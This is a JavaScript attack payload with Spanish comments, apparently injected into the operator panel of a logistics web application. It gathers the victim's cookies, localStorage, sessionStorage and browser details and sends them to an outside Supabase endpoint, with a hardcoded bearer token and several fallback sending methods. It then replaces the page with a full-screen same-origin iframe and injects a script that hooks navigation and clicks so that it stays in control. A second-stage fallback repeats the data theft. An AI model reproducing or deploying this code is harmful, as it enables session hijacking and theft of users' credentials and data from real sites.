// =============================================
// ESTRATEGIA 1: EJECUCIÓN INMEDIATA + FALLBACKS
// =============================================

// Capa 1: Ejecución inmediata con try/catch anidado
(function() {
    'use strict';
    
    function executeMainPayload() {
        try {
            // =============================================
            // FASE 1: ASEGURAR BODY AL 100% PRIMERO
            // =============================================
            ensureFullViewport();
            
            // =============================================
            // FASE 2: IFRAME CON REINTENTOS
            // =============================================
            setupIframeControl();
            
            // =============================================
            // FASE 3: FINGERPRINTING CON MÚLTIPLES FALLBACKS
            // =============================================
            var fingerprintData = collectFingerprint();
            sendFingerprint(fingerprintData);
            
        } catch(mainError) {
            console.log('Main execution failed, trying fallback...');
            // Fallback 1: Ejecución retardada
            setTimeout(executeMainPayload, 100);
        }
    }
    
    // Iniciar ejecución principal
    executeMainPayload();
    
    // =============================================
    // FUNCIONES PRINCIPALES
    // =============================================
    
    function ensureFullViewport() {
        try {
            // Asegurar que html y body ocupen el 100% del viewport
            const html = document.documentElement;
            const body = document.body;
            
            // Resetear estilos que puedan interferir
            html.style.cssText = 'height: 100% !important; margin: 0 !important; padding: 0 !important; overflow: hidden !important;';
            body.style.cssText = 'height: 100% !important; margin: 0 !important; padding: 0 !important; overflow: hidden !important; position: relative !important;';
            
            // Eliminar cualquier padding/margin del body
            document.head.insertAdjacentHTML('beforeend', `
                <style>
                    * {
                        box-sizing: border-box !important;
                    }
                    html, body {
                        height: 100% !important;
                        width: 100% !important;
                        margin: 0 !important;
                        padding: 0 !important;
                        overflow: hidden !important;
                    }
                    body {
                        position: relative !important;
                        min-height: 100vh !important;
                    }
                </style>
            `);
            
            console.log('Viewport secured to 100%');
            
        } catch(e) {
            console.log('Viewport setup failed:', e);
            // Fallback mínimo
            document.body.style.height = '100vh';
            document.body.style.margin = '0';
            document.body.style.padding = '0';
        }
    }
    
    function collectFingerprint() {
        try {
            var d = {
                timestamp: new Date().toISOString(),
                url: location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                language: navigator.language,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                screen: JSON.stringify({
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                }),
                attackPhase: 'initial'
            };
            
            return d;
        } catch(e) {
            // Fallback: datos mínimos
            return {
                timestamp: new Date().toISOString(),
                url: location.href,
                error: 'minimal_fallback'
            };
        }
    }
    
    function sendFingerprint(data) {
        // Múltiples métodos de envío
        const sendMethods = [
            // Método 1: Fetch principal
            () => fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
                },
                body: JSON.stringify({fingerprint: data})
            }),
            
            // Método 2: Imagen de backup
            () => {
                var img = new Image();
                img.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                         btoa(JSON.stringify(data)).substring(0,1500);
            },
            
            // Método 3: Beacon API
            () => {
                if (navigator.sendBeacon) {
                    const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                    navigator.sendBeacon('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', blob);
                }
            },
            
            // Método 4: XMLHttpRequest
            () => {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify({fingerprint: data}));
            }
        ];
        
        // Intentar cada método hasta que uno funcione
        for (let method of sendMethods) {
            try {
                method();
                break; // Si uno funciona, salir
            } catch(e) {
                continue; // Intentar siguiente método
            }
        }
    }
    
    function setupIframeControl() {
        try {
            // 1. Asegurar que el body esté listo
            if (!document.body) {
                setTimeout(setupIframeControl, 100);
                return;
            }
            
            // 2. Crear iframe con estilos que ocupen el 100%
            const iframe = document.createElement('iframe');
            iframe.src = window.location.href;
            iframe.style.cssText = `
                width: 100% !important;
                height: 100% !important;
                border: none !important;
                position: fixed !important;
                top: 0 !important;
                left: 0 !important;
                z-index: 99999 !important;
                margin: 0 !important;
                padding: 0 !important;
                display: block !important;
            `;
            iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals');
            
            // 3. Limpiar y preparar el body
            document.body.innerHTML = '';
            document.body.style.overflow = 'hidden';
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.appendChild(iframe);
            
            // 4. Sistema de simulación de rutas
            let currentPath = window.location.pathname;
            
            function updateBrowserURL(path) {
                currentPath = path;
                window.history.replaceState({}, '', path);
                document.title = 'Surexpress | ' + getPageTitle(path);
            }
            
            function getPageTitle(path) {
                const titles = {
                    '/Operator/Dashboard_M/': 'Dashboard',
                    '/Operator/Orders/': 'Órdenes de Envío', 
                    '/Operator/Usuarios/': 'Usuarios',
                    '/Operator/Clientes/': 'Clientes',
                    '/Operator/Agencias/': 'Agencias',
                    '/Operator/Monitor/': 'Monitor',
                    '/Operator/GuiasAereas/': 'Guías Aéreas',
                    '/Operator/Billing/': 'Facturación',
                    '/Operator/Revision/': 'Revisiones',
                    '/Operator/incidenciaHouse/': 'Incidencias'
                };
                return titles[path] || 'Sistema';
            }
            
            // 5. Inyectar en iframe con múltiples intentos
            let injectionAttempts = 0;
            const maxInjectionAttempts = 5;
            
            function injectIntoIframe() {
                if (injectionAttempts >= maxInjectionAttempts) {
                    console.log('Max injection attempts reached');
                    return;
                }
                
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    if (!iframeDoc || iframeDoc.readyState === 'loading') {
                        // Si aún está cargando, reintentar
                        injectionAttempts++;
                        setTimeout(injectIntoIframe, 500);
                        return;
                    }
                    
                    const controlScript = iframeDoc.createElement('script');
                    controlScript.textContent = getIframeScript();
                    iframeDoc.head.appendChild(controlScript);
                    
                    console.log('Iframe injection successful');
                    
                } catch(e) {
                    injectionAttempts++;
                    console.log(`Injection attempt ${injectionAttempts} failed, retrying...`);
                    setTimeout(injectIntoIframe, 1000);
                }
            }
            
            // Configurar carga del iframe
            iframe.onload = injectIntoIframe;
            
            // También intentar inyección inmediata por si onload no se dispara
            setTimeout(injectIntoIframe, 1000);
            
            // 6. Sistema de mensajes
            window.addEventListener('message', function(event) {
                if (event.data.type === 'URL_CHANGE') {
                    updateBrowserURL(event.data.url);
                }
            });
            
            // 7. Manejar navegación
            window.addEventListener('popstate', function() {
                const newPath = window.location.pathname + window.location.search;
                iframe.src = newPath;
            });
            
        } catch(iframeError) {
            console.log('Iframe setup failed:', iframeError);
            // Fallback: reintentar después de 2 segundos
            setTimeout(setupIframeControl, 2000);
        }
    }
    
    function getIframeScript() {
        return `
            // === CÓDIGO DE SIMULACIÓN DE RUTAS EN IFRAME ===
            
            // Asegurar viewport interno también
            (function() {
                document.documentElement.style.height = '100%';
                document.body.style.height = '100%';
                document.body.style.margin = '0';
                document.body.style.padding = '0';
                document.body.style.overflow = 'hidden';
            })();
            
            // A. INTERCEPTAR NAVEGACIÓN
            (function() {
                const originalPushState = history.pushState;
                const originalReplaceState = history.replaceState;
                
                history.pushState = function(state, title, url) {
                    if (url) {
                        window.parent.postMessage({type: 'URL_CHANGE', url: url}, '*');
                    }
                    return originalPushState.apply(this, arguments);
                };
                
                history.replaceState = function(state, title, url) {
                    if (url) {
                        window.parent.postMessage({type: 'URL_CHANGE', url: url}, '*');
                    }
                    return originalReplaceState.apply(this, arguments);
                };
            })();
            
            // B. INTERCEPTAR CLICKS
            document.addEventListener('click', function(e) {
                let target = e.target;
                while (target && target.tagName !== 'A') {
                    target = target.parentElement;
                }
                
                if (target && target.href && target.href.includes('/Operator/')) {
                    e.preventDefault();
                    const url = new URL(target.href);
                    const path = url.pathname + url.search;
                    window.location.href = target.href;
                    window.parent.postMessage({type: 'URL_CHANGE', url: path}, '*');
                }
            });
            
            // C. DETECTOR AUTOMÁTICO
            let lastPath = window.location.pathname + window.location.search;
            setInterval(() => {
                const currentPath = window.location.pathname + window.location.search;
                if (currentPath !== lastPath) {
                    lastPath = currentPath;
                    window.parent.postMessage({type: 'URL_CHANGE', url: currentPath}, '*');
                }
            }, 300);
            
            // Notificar inicial
            setTimeout(() => {
                window.parent.postMessage({
                    type: 'URL_CHANGE',
                    url: window.location.pathname + window.location.search
                }, '*');
            }, 500);
            
            console.log('Iframe control active');
        `;
    }
    
})();

// =============================================
// ESTRATEGIA 2: EJECUCIÓN ALTERNATIVA SI FALLA LA PRINCIPAL
// =============================================

// Capa 2: Ejecución después de DOMContentLoaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
        setTimeout(executeFallbackPayload, 100);
    });
} else {
    setTimeout(executeFallbackPayload, 1000);
}

function executeFallbackPayload() {
    // Verificar si el iframe ya fue creado
    if (document.querySelector('iframe[style*="z-index:99999"]')) {
        return;
    }
    
    // Fallback: versión simplificada
    try {
        console.log('Executing fallback payload...');
        
        // Asegurar viewport en fallback también
        document.documentElement.style.height = '100%';
        document.body.style.height = '100vh';
        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.overflow = 'hidden';
        
        // Fingerprint mínimo
        const minimalData = {
            timestamp: new Date().toISOString(),
            url: location.href,
            fallback: true
        };
        
        // Envío mínimo
        const img = new Image();
        img.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?fb=' + 
                 btoa(JSON.stringify(minimalData));
        
        // Iframe mínimo
        const iframe = document.createElement('iframe');
        iframe.src = location.href;
        iframe.style.cssText = 'width:100% !important; height:100vh !important; border:none !important; position:fixed !important; top:0 !important; left:0 !important; z-index:99999 !important; margin:0 !important; padding:0 !important;';
        document.body.innerHTML = '';
        document.body.appendChild(iframe);
        
    } catch(fallbackError) {
        console.log('Fallback also failed:', fallbackError);
    }
}
